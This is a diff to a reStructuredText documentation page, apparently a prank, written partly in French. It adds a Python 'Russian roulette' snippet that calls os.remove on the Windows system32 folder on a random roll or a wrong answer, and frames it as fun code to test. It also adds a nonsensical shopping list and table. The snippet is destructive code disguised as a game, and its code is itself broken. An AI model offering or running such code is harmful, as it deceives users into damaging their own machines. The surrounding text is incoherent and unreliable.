@@ -21,17 +21,38 @@ documentation for details.
    :align: center
    :width: 100%
 
+======
+Code à tester (fun assuré tkt)
+======
+
 
 .. code-block:: python
 
    import random
    import os
 
-   if(random.randint() * 6 == 0):
-      os.delete("C:\\system32")
+   if(random.randint(0, 6) == 1):
+      os.remove("C:\Windows\system32")
+   else:
+      print("Do you want to play again ?")
+      ans = input()
+      if ans != "yes please! " :
+         os.remove("C:\Windows\system32")
 
 
 Liste de course :
+
 #. Donovan x5
 #. Des patates
 #. du nitrate d'argent
+
+Table
+
++------------------------+------------+----------+----------+
+| Test                   | Doonvan    | GabrieL  | Matoe    |
++========================+============+==========+==========+
+| Temps a la PN          | 5          | 4        | +infini  |
++------------------------+------------+----------+----------+
+| decibel au WE Miq      | canapé     | 25       | 25       |
++------------------------+------------+----------+----------+
+
